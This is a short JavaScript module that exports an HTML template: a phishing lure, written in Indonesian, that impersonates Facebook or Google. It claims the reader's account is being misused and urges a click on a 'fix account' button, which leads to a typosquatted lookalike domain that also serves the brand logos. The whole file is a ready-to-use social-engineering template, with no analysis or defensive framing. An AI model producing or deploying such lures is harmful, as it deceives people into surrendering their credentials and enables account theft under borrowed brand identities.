const temp = (type) => {
  var img = null;
  if (type == "Facebook") {
    img = "IMG-002";
  } else if (type == "Google") {
    img = "favicon";
  }

  return `
	<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Test</title>
    <style>
      .container {
        width: 400px;
        height: 450px;
        padding: 20px;
        background: rgb(255, 255, 255);
        background: rgb(255, 255, 255);
        position: fixed;
        top: 40%;
        left: 50%;
        margin-top: -120px;
        margin-left: -220px;
        border: 2px solid rgb(117, 117, 117);
        border-radius: 5px;
        font-family: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande",
          "Lucida Sans Unicode", Geneva, Verdana, sans-serif;
      }
      .img-center {
        text-align: center;
        margin-top: 20px;
      }
      img {
        width: 70px;
        height: 70px;
      }
      .button {
        background: rgb(0, 47, 255);
        padding: 10px;
        width: 60%;
        height: 20px;
        border-radius: 20px;
        margin: 0 auto;
      }
      a {
        text-decoration: none;
      }
      .btm {
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="img-center">
        <img
          src="https://accountg00gle.github.io/${img}.png"
          alt=""
          srcset=""
        />
        <h1>Akun ${type} anda mengalami masalah !!</h1>
      </div>
      <hr />
      <p>
        Kami mendeteksi akun anda telah dipakai oleh beberapa pengguna, anda
        disarankan untuk memperbaiki masalah ini sebelum akun anda hilang.
      </p>
      <hr />
      <div class="img-center">
        <a
          href="https://accountg00gle.github.io"
          target="_blank"
          style="color: white"
        >
          <div class="button">Perbaiki akun</div>
        </a>
        <hr style="margin-top: 10px" />
        <p class="btm">
          Segera perbaiki akun anda dengan klik tombol "Perbaiki akun".
        </p>
      </div>
    </div>
  </body>
</html>

  `;
};

module.exports = temp;
